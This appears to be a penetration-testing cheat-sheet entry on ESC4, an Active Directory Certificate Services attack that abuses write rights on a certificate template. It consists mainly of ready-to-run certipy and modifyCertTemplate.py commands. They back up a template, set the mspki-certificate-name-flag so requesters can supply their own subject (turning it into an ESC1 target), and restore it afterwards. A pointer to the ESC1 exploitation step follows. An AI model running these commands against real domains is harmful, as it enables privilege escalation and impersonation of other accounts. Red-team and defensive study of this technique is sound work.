# ESC4 - Dangerous permissions
When a user has write privilege on a certificate template, it is then possible to make this template vulnerable to ESC1 (by enabling the `mspki-certificate-name-flag` flag).

## Exploitation
-------

Save the old configuration, edit the template and make it vulnerable (ESC1)

```text-plain
certipy template -u [USER] -p [PASSWORD] -dc-ip [DC_IP] -template [templateName] -save-old
```

```text-plain
modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -add enrollee_supplies_subject -property mspki-Certificate-Name-Flag
```

Exploit ESC1 on the modified ESC4 template (custom SAN)

```text-plain
see ESC1 exploit
```

After the attack, restore the original configuration

```text-plain
certipy template -u [USER]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP] -template [templateName] -configuration [templateName.json]
```

```text-plain
modifyCertTemplate.py domain.local/user -k -no-pass -template user -dc-ip 10.10.10.10 -value 0 -property mspki-Certificate-Name-Flag
```

## Notes

- It is also possible to make the certificate vulnerable to ESC2-3 vulnerability
- if needed, it is also possible to allow authentication with certificate.
